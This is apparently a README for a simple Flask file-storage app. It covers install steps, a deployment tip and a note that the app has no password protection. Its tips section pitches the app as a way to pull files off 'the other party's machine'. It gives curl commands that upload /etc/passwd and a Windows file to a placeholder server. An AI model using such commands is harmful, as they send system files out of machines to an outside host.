# webstorage
#### 基于python3 开发的flask的简单文件存储
    用于远程下载、异地备份、私人网盘等

### 使用方法
    1. git clone https://github.com/mycve/webstorage.git
    2. cd webstorage
    3. pip3 install -r requirements.txt
    4. python3 app.py
    5. 访问 https://ip:8899 (默认端口8899)

#### 本着轻量级原则，未加密码等功能，私人用吧...

#### Tips：推荐部署到外企一家`python runtime`（:- ♥♥♥ because：forever free
#### [点击直达](https://www.pythonanywhere.com/)

### Demo(是我已经部署好的，地址我就不放了)
![image](https://raw.githubusercontent.com/mycve/webstorage/main/demo.gif)


### 小技巧（拖对方机器文件、快捷上传等）：
    curl https://xxxxx.com/api?action=upload -F "file=@/etc/passwd"
    curl https://xxxxx.com/api?action=upload -F "file=@c://1.txt"

### 执行完了，回到网页刷新网盘 （:- over